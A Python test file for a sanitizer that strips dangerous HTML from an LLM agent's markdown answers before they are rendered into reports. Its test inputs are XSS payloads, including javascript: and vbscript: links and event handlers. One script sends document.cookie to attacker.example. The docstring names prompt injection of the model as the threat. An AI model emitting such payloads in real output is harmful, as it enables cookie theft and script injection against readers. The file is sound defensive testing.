"""Tests for the markdown-output HTML sanitizer in report_generator.

The markdown library's default mode allows raw HTML. An LLM under
prompt-injection (or a benign model misfire) can therefore put
<script>, <iframe>, javascript: URLs, or on* event handlers in the
agent's final_answer, and that payload flows through to the rendered
report. WeasyPrint (the PDF path) ignores scripts, but the
write_pdf_or_html fallback returns text/html when WeasyPrint fails,
and the downloaded report.html executes any embedded payload when
opened in a browser.

The sanitizer (_strip_dangerous_html) sits between the markdown
output and the document shell. It strips the dangerous tag surface
and dangerous URL schemes without touching the benign HTML the
markdown library produces (paragraphs, lists, tables, code blocks,
em/strong, links to https://, etc.).

Tests pin:
- <script>, <iframe>, <object>, <embed>, <style>, <form> are removed
  along with their content
- on*= event handlers are stripped from any tag
- href="javascript:" and src="javascript:" URLs are stripped
- benign markdown (paragraphs, lists, tables, links, code) survives
  unchanged
- a fast path returns the input verbatim when no dangerous token is
  present (so the common-case LLM answer has zero overhead)
"""

from __future__ import annotations

import pytest

from arena.core.report_generator import (
    _markdown_answer_html,
    _strip_dangerous_html,
)


# ── tag-removal tests ──────────────────────────────────────────


def test_strip_script_tag_with_content():
    html_in = "<p>before</p><script>alert(1)</script><p>after</p>"
    out = _strip_dangerous_html(html_in)
    assert "<script" not in out
    assert "alert(1)" not in out
    assert "before" in out
    assert "after" in out


def test_strip_iframe_tag_with_content():
    html_in = '<iframe src="https://evil.example"></iframe><p>safe</p>'
    out = _strip_dangerous_html(html_in)
    assert "<iframe" not in out
    assert "evil.example" not in out
    assert "<p>safe</p>" in out


def test_strip_object_and_embed():
    html_in = (
        '<object data="evil.swf"></object>'
        '<embed src="evil.swf">'
        "<p>kept</p>"
    )
    out = _strip_dangerous_html(html_in)
    assert "<object" not in out
    assert "<embed" not in out
    assert "evil.swf" not in out
    assert "<p>kept</p>" in out


def test_strip_style_tag():
    html_in = "<style>body { display:none }</style><p>visible</p>"
    out = _strip_dangerous_html(html_in)
    assert "<style" not in out
    assert "display:none" not in out
    assert "<p>visible</p>" in out


def test_strip_form_and_input():
    html_in = '<form action="x"><input name="z"></form><p>kept</p>'
    out = _strip_dangerous_html(html_in)
    assert "<form" not in out
    assert "<input" not in out
    assert "<p>kept</p>" in out


# ── attribute-stripping tests ──────────────────────────────────


def test_strip_onerror_event_handler():
    html_in = '<p onerror="alert(1)">safe text</p>'
    out = _strip_dangerous_html(html_in)
    assert "onerror" not in out.lower()
    assert "alert(1)" not in out
    assert "safe text" in out


def test_strip_onclick_event_handler():
    html_in = '<a href="https://x.test" onclick="steal()">link</a>'
    out = _strip_dangerous_html(html_in)
    assert "onclick" not in out.lower()
    assert "steal" not in out
    assert 'href="https://x.test"' in out
    assert ">link</a>" in out


def test_strip_javascript_href():
    html_in = '<a href="javascript:alert(1)">click</a>'
    out = _strip_dangerous_html(html_in)
    assert "javascript:" not in out.lower()
    assert "alert(1)" not in out


def test_strip_javascript_src():
    html_in = '<img src="javascript:alert(1)">'
    out = _strip_dangerous_html(html_in)
    assert "javascript:" not in out.lower()


def test_strip_vbscript_href():
    html_in = '<a href="vbscript:msgbox(1)">click</a>'
    out = _strip_dangerous_html(html_in)
    assert "vbscript:" not in out.lower()
    assert "msgbox" not in out


def test_strip_data_text_html_href():
    html_in = '<a href="data:text/html,<script>alert(1)</script>">x</a>'
    out = _strip_dangerous_html(html_in)
    assert "data:text/html" not in out.lower()
    assert "<script" not in out


# ── benign-passthrough tests ───────────────────────────────────


def test_passthrough_paragraphs():
    html_in = "<p>Hello world.</p><p>Second paragraph.</p>"
    out = _strip_dangerous_html(html_in)
    assert "<p>Hello world.</p>" in out
    assert "<p>Second paragraph.</p>" in out


def test_passthrough_emphasis():
    html_in = "<p>This is <em>emphasised</em> and <strong>bold</strong>.</p>"
    out = _strip_dangerous_html(html_in)
    assert "<em>emphasised</em>" in out
    assert "<strong>bold</strong>" in out


def test_passthrough_https_link():
    html_in = '<p>See <a href="https://example.com">example</a> for details.</p>'
    out = _strip_dangerous_html(html_in)
    assert 'href="https://example.com"' in out
    assert ">example</a>" in out


def test_passthrough_code_block():
    html_in = "<pre><code>print('hi')</code></pre>"
    out = _strip_dangerous_html(html_in)
    assert "<pre>" in out
    assert "<code>" in out
    assert "print('hi')" in out


def test_passthrough_table():
    html_in = (
        "<table>"
        "<thead><tr><th>a</th><th>b</th></tr></thead>"
        "<tbody><tr><td>1</td><td>2</td></tr></tbody>"
        "</table>"
    )
    out = _strip_dangerous_html(html_in)
    assert "<table>" in out
    assert "<th>a</th>" in out
    assert "<td>1</td>" in out


def test_passthrough_unordered_list():
    html_in = "<ul><li>one</li><li>two</li></ul>"
    out = _strip_dangerous_html(html_in)
    assert "<ul>" in out
    assert "<li>one</li>" in out
    assert "<li>two</li>" in out


# ── fast-path test ─────────────────────────────────────────────


def test_fast_path_returns_input_verbatim_when_clean():
    """The fast path must not allocate an HTMLParser for clean input.

    A well-behaved LLM answer contains no dangerous tokens at all —
    the function should detect that and return the input string
    unchanged, without paying the parse overhead. We verify the
    fast path by checking the output is byte-equal to the input.
    """
    html_in = (
        "<h2>Summary</h2>"
        "<p>This is a <em>clean</em> answer with a "
        '<a href="https://example.com">link</a> and a list:</p>'
        "<ul><li>one</li><li>two</li></ul>"
        "<pre><code>x = 1</code></pre>"
    )
    out = _strip_dangerous_html(html_in)
    assert out == html_in


# ── end-to-end _markdown_answer_html test ──────────────────────


def test_markdown_answer_html_strips_injected_script():
    """End-to-end: a markdown body containing a raw <script> tag (which
    the markdown library passes through by default) must be sanitized
    before being wrapped in the answer-md div.
    """
    md = (
        "Here's a clean answer.\n\n"
        "<script>fetch('https://attacker.example/?c='+document.cookie)</script>\n\n"
        "Final paragraph."
    )
    out = _markdown_answer_html(md)
    assert "<script" not in out
    assert "attacker.example" not in out
    assert "Final paragraph." in out
    # The answer-md wrapper is the only div the renderer adds.
    assert out.startswith('<div class="answer-md">')
    assert out.endswith("</div>")


def test_markdown_answer_html_preserves_legitimate_markdown():
    md = (
        "# Heading\n\n"
        "A paragraph with **bold** and *italic*.\n\n"
        "- item one\n- item two\n\n"
        "```python\nprint('hi')\n```\n\n"
        "[link](https://example.com)\n"
    )
    out = _markdown_answer_html(md)
    assert "<h1>Heading</h1>" in out
    assert "<strong>bold</strong>" in out
    assert "<em>italic</em>" in out
    assert "<li>item one</li>" in out
    assert "<code" in out and "print" in out
    assert 'href="https://example.com"' in out


def test_markdown_answer_html_strips_javascript_link_in_text():
    """A markdown link with a javascript: URL must not produce a
    clickable javascript: link in the rendered HTML.
    """
    md = "[click me](javascript:alert(1))"
    out = _markdown_answer_html(md)
    assert "javascript:" not in out.lower()
